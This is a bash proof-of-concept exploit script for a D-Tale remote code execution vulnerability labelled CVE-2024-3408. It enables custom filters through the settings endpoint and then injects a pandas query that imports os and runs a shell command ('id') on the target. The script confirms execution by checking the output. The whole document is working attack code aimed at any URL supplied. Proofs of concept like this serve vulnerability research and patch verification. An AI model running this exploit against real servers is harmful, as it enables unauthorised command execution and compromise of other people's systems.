#!/bin/bash
# CVE-2024-3408 D-Tale RCE Proof of Concept
# Usage: ./poc.sh [target_url]

TARGET="${1:-http://localhost:40000}"

echo "[*] Target: $TARGET"
echo "[*] Step 1: Enabling custom filters..."

RESULT=$(curl -s "${TARGET}/dtale/update-settings/1?settings=%7B%22enable_custom_filters%22%3Atrue%7D")
if echo "$RESULT" | grep -q '"success":true'; then
    echo "[+] Custom filters enabled"
else
    echo "[-] Failed to enable custom filters"
    echo "$RESULT"
    exit 1
fi

echo "[*] Step 2: Executing 'id' command via pandas query injection..."

RESULT=$(curl -s -G "${TARGET}/dtale/test-filter/1" \
    --data-urlencode "query=@pd.core.frame.com.builtins.__import__('os').popen('id').read()")

if echo "$RESULT" | grep -q "uid="; then
    echo "[+] RCE confirmed!"
    echo "$RESULT" | grep -o '"error":"[^"]*"' | sed 's/"error":"//;s/"$//'
else
    echo "[-] RCE failed or target not vulnerable"
    echo "$RESULT"
    exit 1
fi

